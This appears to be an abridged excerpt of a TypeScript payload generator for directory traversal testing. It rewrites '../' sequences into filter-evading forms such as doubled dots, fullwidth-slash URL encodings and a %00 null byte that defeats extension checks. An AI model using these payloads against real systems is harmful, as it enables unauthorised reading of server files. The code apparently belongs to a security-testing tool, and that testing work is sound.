...
export default class DirectoryTraversalGenerator implements BaseGenerator {
  ...
  private init = () => {
    ...
    if (doubleWrite) {
      if (isLinux) {
        list.push(
          ...allLevelKeys.map((key) => key.replace(/\.\.\//g, "....//"))
        );
      } else {
        list.push(
          ...allLevelKeys.map((key) => key.replace(/\.\.\\/g, "....\\\\"))
    ...
    if (nonStandardEncode2) {
      if (isLinux) {
        list.push(
          ...allLevelKeys.map((key) => key.replace(/\//g, "%ef%bc%8f"))
        );
      } else {
        list.push(
          ...allLevelKeys.map((key) => key.replace(/\\/g, "%ef%bc%bc"))
        );
      }
    }
    ...
    const dedupList = [
      ...new Set(
        list.map(
          (item) =>
            `${item}${fileName}${
              extName ? `${skipExtensionCheck ? "%00" : ""}.${extName}` : ""
            }`
        )
      ),
    ];
